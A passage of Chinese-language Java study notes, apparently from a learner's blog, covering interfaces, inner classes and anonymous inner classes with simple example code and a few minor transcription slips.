<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   接口：接口体现的是规范。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SportMan</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>; <span class="comment">// 抽象方法，跑步。</span></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">law</span><span class="params">()</span>; <span class="comment">// 抽象方法，遵守法律。</span></span><br><span class="line">    String <span class="title function_">compittion</span><span class="params">(String project)</span>;  <span class="comment">// 抽象方法，比赛。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*接口的实现：</span></span><br><span class="line"><span class="comment">*在Java中接口是被实现的，实现接口的类称为实现类。</span></span><br><span class="line"><span class="comment">*实现类的格式:</span></span><br><span class="line"><span class="comment">*     class 类名 implements 接口1,接口2,接口3...&#123;...&#125;</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PingPongMan</span>  <span class="keyword">implements</span> <span class="title class_">SportMan</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;乒乓球运动员稍微跑一下！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">law</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;乒乓球运动员守法！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">compittion</span><span class="params">(String project)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;参加&quot;</span> + project + <span class="string">&quot;得金牌！&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建实现类对象。</span></span><br><span class="line">        <span class="type">PingPongMan</span> <span class="variable">zjk</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PingPongMan</span>();</span><br><span class="line">        zjk.run();</span><br><span class="line">        zjk.law();</span><br><span class="line">        System.out.println(zjk.compittion(<span class="string">&quot;全球乒乓球比赛&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="类与接口多实现案例"><a class="header-anchor" href="#类与接口多实现案例">¶</a>类与接口多实现案例</h5>
<ul>
<li><strong>类与接口之间的关系是多实现的，一个类可以同时实现多个接口</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** 法律规范：接口*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Law</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 这一个运动员的规范：接口*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SportMan</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*Java中接口是可以被多实现的：</span></span><br><span class="line"><span class="comment">*一个类可以实现多个接口: Law, SportMan</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JumpMan</span> <span class="keyword">implements</span> <span class="title class_">Law</span> ,SportMan &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;尊长守法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;训练跑步！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*Java中接口是可以被多实现的：</span></span><br><span class="line"><span class="comment">*一个类可以实现多个接口: Law, SportMan</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JumpMan</span> <span class="keyword">implements</span> <span class="title class_">Law</span> ,SportMan &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;尊长守法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;训练跑步！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="接口与接口的多继承（没太懂-）"><a class="header-anchor" href="#接口与接口的多继承（没太懂-）">¶</a>接口与接口的多继承（没太懂= =）</h4>
<ul>
<li>
<p>接口与接口之间是可以多继承的</p>
</li>
<li>
<p>注意：<strong>类与接口是实现关系，接口与接口是继承关系</strong></p>
</li>
<li>
<p>接口继承接口就是把其他接口的抽象方法与本接口进行了合并</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Abc</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">go</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** 法律规范：接口*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Law</span> &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">rule</span><span class="params">()</span>;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> *</span><br><span class="line"> *总结：</span><br><span class="line"> *    接口与类之间是多实现的。</span><br><span class="line"> *    接口与接口之间是多继承的。</span><br><span class="line"> * */</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SportMan</span> <span class="keyword">extends</span> <span class="title class_">Law</span> , Abc &#123;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="扩展：接口的细节"><a class="header-anchor" href="#扩展：接口的细节">¶</a>扩展：接口的细节</h4>
<ul>
<li>会用就行，报错时懂得修改</li>
</ul>
<ol>
<li>当两个接口中存在相同抽象方法的时候，该怎么办？</li>
</ol>
<blockquote>
<p>只要重写一次即可。此时重写的方法，既表示重写1接口的，也表示重写2接口的。</p>
</blockquote>
<ol start="2">
<li>实现类能不能继承A类的时候，同时实现其他接口呢？</li>
</ol>
<blockquote>
<p>继承的父类，就好比是亲爸爸一样</p>
<p>实现的接口，就好比是干爹一样</p>
<p>可以继承一个类的同时，再实现多个接口，只不过，要把接口里面所有的抽象方法，全部实现。</p>
</blockquote>
<ol start="3">
<li>实现类能不能继承一个抽象类的时候，同时实现其他接口呢？</li>
</ol>
<blockquote>
<p>实现类可以继承一个抽象类的同时，再实现其他多个接口，只不过要把里面所有的抽象方法全部重写。</p>
</blockquote>
<ol start="4">
<li>实现类Zi，实现了一个接口，还继承了一个Fu类。假设在接口中有一个方法，父类中也有一个相同的方法。子类如何操作呢？</li>
</ol>
<blockquote>
<p>处理办法一：如果父类中的方法体，能满足当前业务的需求，在子类中可以不用重写。</p>
<p>处理办法二：如果父类中的方法体，不能满足当前业务的需求，需要在子类中重写。</p>
</blockquote>
<ol start="5">
<li>如果一个接口中，有10个抽象方法，但是我在实现类中，只需要用其中一个，该怎么办?</li>
</ol>
<blockquote>
<p>可以在接口跟实现类中间，新建一个中间类（适配器类）</p>
<p>让这个适配器类去实现接口，对接口里面的所有的方法做空重写。</p>
<p>让子类继承这个适配器类，想要用到哪个方法，就重写哪个方法。</p>
<p>因为中间类没有什么实际的意义，所以一般会把中间类定义为抽象的，不让外界创建对象</p>
</blockquote>
<h3 id="内部类"><a class="header-anchor" href="#内部类">¶</a>内部类</h3>
<ul>
<li>将一个类A定义在另一个类B里面，里面的那个类A就称为<strong>内部类</strong>，B则称为<strong>外部类</strong></li>
<li>可以把内部类理解成寄生，外部类理解成宿主</li>
</ul>
<h4 id="概述-v2"><a class="header-anchor" href="#概述-v2">¶</a>概述</h4>
<ul>
<li>什么时候用内部类：</li>
<li>一个事物内部还有一个独立的事物，内部的事物脱离外部的事物无法独立使用
<ol>
<li>人里面有一颗心脏。</li>
<li>汽车内部有一个发动机。</li>
<li>为了实现更好的封装性。</li>
</ol>
</li>
</ul>
<h4 id="分类-v2"><a class="header-anchor" href="#分类-v2">¶</a>分类</h4>
<ul>
<li>按定义的位置来分</li>
</ul>
<ol>
<li>**成员内部类，类定义在了成员位置 (类中方法外称为成员位置，无static修饰的内部类)</li>
<li><strong>静态内部类</strong>，类定义在了成员位置 (类中方法外称为成员位置，有static修饰的内部类)</li>
<li><strong>局部内部类</strong>，类定义在方法内</li>
<li><strong>匿名内部类</strong>，没有名字的内部类，可以在方法中，也可以在类中方法外。</li>
</ol>
<h4 id="成员内部类"><a class="header-anchor" href="#成员内部类">¶</a>成员内部类</h4>
<h6 id="特点-v2"><a class="header-anchor" href="#特点-v2">¶</a>特点</h6>
<ul>
<li>无static修饰的内部类，属于外部类对象的</li>
<li>宿主：外部类对象</li>
</ul>
<h6 id="使用格式"><a class="header-anchor" href="#使用格式">¶</a>使用格式</h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">外部类.内部类 <span class="comment">// 访问内部类的类型都是用 外部类.内部类</span></span><br></pre></td></tr></table></figure>
<h6 id="获取成员内部类对象的两种方式"><a class="header-anchor" href="#获取成员内部类对象的两种方式">¶</a><strong>获取成员内部类对象的两种方式</strong></h6>
<p>方式一：外部直接创建成员内部类的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">外部类.内部类 变量 = <span class="keyword">new</span> 外部类（）.new 内部类（）;</span><br></pre></td></tr></table></figure>
<p>方式二：在外部类中定义一个方法提供内部类的对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">方式一：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//  宿主：外部类对象。</span></span><br><span class="line">       <span class="comment">// Outer out = new Outer();</span></span><br><span class="line">        <span class="comment">// 创建内部类对象。</span></span><br><span class="line">        Outer.<span class="type">Inner</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>().<span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">        oi.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    <span class="comment">// 成员内部类，属于外部类对象的。</span></span><br><span class="line">    <span class="comment">// 拓展：成员内部类不能定义静态成员。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="comment">// 这里面的东西与类是完全一样的。</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;内部类中的方法被调用了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">方式二：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Outer</span> &#123;</span><br><span class="line">    String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">class</span> <span class="title class_">Inner</span>&#123;</span><br><span class="line">        <span class="keyword">static</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Inner <span class="title function_">getInstance</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Inner</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Outer</span> <span class="variable">o</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>();</span><br><span class="line">        System.out.println(o.getInstance());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="成员内部类的细节"><a class="header-anchor" href="#成员内部类的细节">¶</a>成员内部类的细节</h4>
<ul>
<li>编写成员内部类的注意点：</li>
</ul>
<ol>
<li>成员内部类可以被一些修饰符所修饰，比如： private，默认，protected，public，static等</li>
<li>在成员内部类里面，JDK16之前不能定义静态变量，JDK16开始才可以定义静态变量。</li>
<li>创建内部类对象时，对象中有一个隐含的Outer.this记录外部类对象的地址值。</li>
</ol>
<h4 id="成员内部类面试题"><a class="header-anchor" href="#成员内部类面试题">¶</a>成员内部类面试题</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Outer.<span class="type">inner</span> <span class="variable">oi</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer</span>().<span class="keyword">new</span> <span class="title class_">inner</span>();</span><br><span class="line">        oi.method();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer</span> &#123;        <span class="comment">// 外部类</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">30</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 在成员位置定义一个类</span></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">inner</span> &#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">            System.out.println(???);        <span class="comment">// 10   答案：a</span></span><br><span class="line">            System.out.println(???);        <span class="comment">// 20        答案：this.a</span></span><br><span class="line">            System.out.println(???);        <span class="comment">// 30        答案：Outer.this.a</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>注意：内部类访问外部类对象的格式是：<strong>外部类名.this</strong></li>
</ul>
<h4 id="成员内部类内存图"><a class="header-anchor" href="#成员内部类内存图">¶</a>成员内部类内存图</h4>
<ul>
<li>此处缺少一张图</li>
<li>目前技术还不到位</li>
</ul>
<h3 id="静态内部类"><a class="header-anchor" href="#静态内部类">¶</a>静态内部类</h3>
<ul>
<li>一种特殊的成员内部类</li>
<li>有static修饰，属于外部类本身的</li>
<li>总结：静态内部类与其他类的用法完全一样。只是访问的时候需要加上外部类.内部类</li>
<li><strong>拓展1</strong>:静态内部类可以直接访问外部类的静态成员</li>
<li><strong>拓展2</strong>:静态内部类不可以直接访问外部类的非静态成员，如果要访问需要创建外部类的对象</li>
<li><strong>拓展3</strong>:静态内部类中没有银行的Outer.this</li>
</ul>
<h4 id="创建格式"><a class="header-anchor" href="#创建格式">¶</a>创建格式</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">外部类.内部类  变量 = <span class="keyword">new</span>  外部类.内部类构造器;</span><br></pre></td></tr></table></figure>
<h4 id="调用方法"><a class="header-anchor" href="#调用方法">¶</a>调用方法</h4>
<ul>
<li>调用非静态方法的格式：先创建对象，用对象调用</li>
<li>调用静态方法的格式：外部类名.内部类名.方法名();</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 外部类：Outer01</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Outer01</span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span>  <span class="type">String</span> <span class="variable">sc_name</span> <span class="operator">=</span> <span class="string">&quot;黑马程序&quot;</span>;</span><br><span class="line">    <span class="comment">// 内部类: Inner01</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Inner01</span>&#123;</span><br><span class="line">        <span class="comment">// 这里面的东西与类是完全一样的。</span></span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Inner01</span><span class="params">(String name)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">showName</span><span class="params">()</span>&#123;</span><br><span class="line">            System.out.println(<span class="built_in">this</span>.name);</span><br><span class="line">            <span class="comment">// 拓展:静态内部类可以直接访问外部类的静态成员。</span></span><br><span class="line">            System.out.println(sc_name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InnerClassDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建静态内部类对象。</span></span><br><span class="line">        <span class="comment">// 外部类.内部类  变量 = new  外部类.内部类构造器;</span></span><br><span class="line">        Outer01.<span class="type">Inner01</span> <span class="variable">in</span>  <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Outer01</span>.Inner01(<span class="string">&quot;张三&quot;</span>);</span><br><span class="line">        in.showName();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="局部内部类"><a class="header-anchor" href="#局部内部类">¶</a>局部内部类</h3>
<ul>
<li>定义在<strong>方法中</strong>的类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">class 外部类名 &#123;</span><br><span class="line">  数据类型 变量名;</span><br><span class="line">  修饰符 返回值类型 方法名(参数列表) &#123;</span><br><span class="line">      <span class="comment">// …</span></span><br><span class="line">      class 内部类 &#123;</span><br><span class="line">      <span class="comment">// 成员变量</span></span><br><span class="line">      <span class="comment">// 成员方法</span></span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="【▷】匿名内部类"><a class="header-anchor" href="#【▷】匿名内部类">¶</a>【▷】匿名内部类</h3>
<ul>
<li>开发中最常用到的内部类</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 类名或者接口名() &#123;</span><br><span class="line">     重写方法;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>包含了：
<ul>
<li>继承或实现关系</li>
<li>方法重写</li>
<li>创建对象</li>
</ul>
</li>
</ul>
<h4 id="匿名内部类使用场景"><a class="header-anchor" href="#匿名内部类使用场景">¶</a>匿名内部类使用场景</h4>
<ul>
<li>希望定义一个只使用一次的类</li>
<li>本质：简化代码</li>
<li>之前使用接口的步骤：</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 定义子类</span><br><span class="line"><span class="number">2.</span> 重写接口中的方法</span><br><span class="line"><span class="number">3.</span> 创建子类对象</span><br><span class="line"><span class="number">4.</span> 调用重写后的方法</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 定义接口的实现类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span> <span class="keyword">implements</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="comment">// 2. 重写抽象方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;狗刨式...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 3. 创建实现类对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        <span class="comment">// 4. 调用方法</span></span><br><span class="line">        s.swimming();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>更快的实现以上四个步骤的方式：匿名内部类</li>
</ul>
<h4 id="匿名内部类前提和格式"><a class="header-anchor" href="#匿名内部类前提和格式">¶</a>匿名内部类前提和格式</h4>
<ul>
<li>必须<strong>继承一个父类</strong>或者<strong>实现一个父接口</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> 父类名或者接口名()&#123;</span><br><span class="line">    <span class="comment">// 方法重写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 执行语句</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h4 id="使用方式-v2"><a class="header-anchor" href="#使用方式-v2">¶</a>使用方式</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 使用匿名内部类</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">                        <span class="meta">@Override</span></span><br><span class="line">                        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                                System.out.println(<span class="string">&quot;自由泳...&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;.swimming();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 接口 变量 = new 实现类(); // 多态,走子类的重写方法</span></span><br><span class="line">        <span class="type">Swim</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;蛙泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        s2.swimming();</span><br><span class="line">        s2.swimming();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="特点-v3"><a class="header-anchor" href="#特点-v3">¶</a>特点</h4>
<ol>
<li>定义一个没有名字的内部类</li>
<li>这个类实现了父类，或者父类接口</li>
<li>匿名内部类会创建这个没有名字的类的对象</li>
</ol>
<h4 id="使用场景"><a class="header-anchor" href="#使用场景">¶</a>使用场景</h4>
<ul>
<li>通常在方法的形式参数是接口或者抽象类时，也可以将匿名内部类作为参数传递</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Swim</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo07</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 普通方式传入对象</span></span><br><span class="line">        <span class="comment">// 创建实现类对象</span></span><br><span class="line">        <span class="type">Student</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        goSwimming(s);</span><br><span class="line">        <span class="comment">// 匿名内部类使用场景:作为方法参数传递</span></span><br><span class="line">        <span class="type">Swim</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;蝶泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 传入匿名内部类</span></span><br><span class="line">        goSwimming(s3);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 完美方案: 一步到位</span></span><br><span class="line">        goSwimming(<span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;大学生, 蛙泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        goSwimming(<span class="keyword">new</span> <span class="title class_">Swim</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">swimming</span><span class="params">()</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;小学生, 自由泳...&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 定义一个方法,模拟请一些人去游泳</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">goSwimming</span><span class="params">(Swim s)</span> &#123;</span><br><span class="line">        s.swimming();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有点没看懂= =</li>
</ul>
<h2 id="Day16-面向对象综合练习（上）"><a class="header-anchor" href="#Day16-面向对象综合练习（上）">¶</a>Day16 面向对象综合练习（上）</h2>
<ul>
<li>利用Java的<strong>图形化界面</strong>，写一个项目，知道前面学习的知识点在实际开发中的应用场景</li>
</ul>
<h3 id="实现思路"><a class="header-anchor" href="#实现思路">¶</a>实现思路</h3>
<ul>
<li>先写游戏主界面，实现步骤如下：</li>
</ul>
<ol>
<li>完成最外层窗体的搭建。</li>
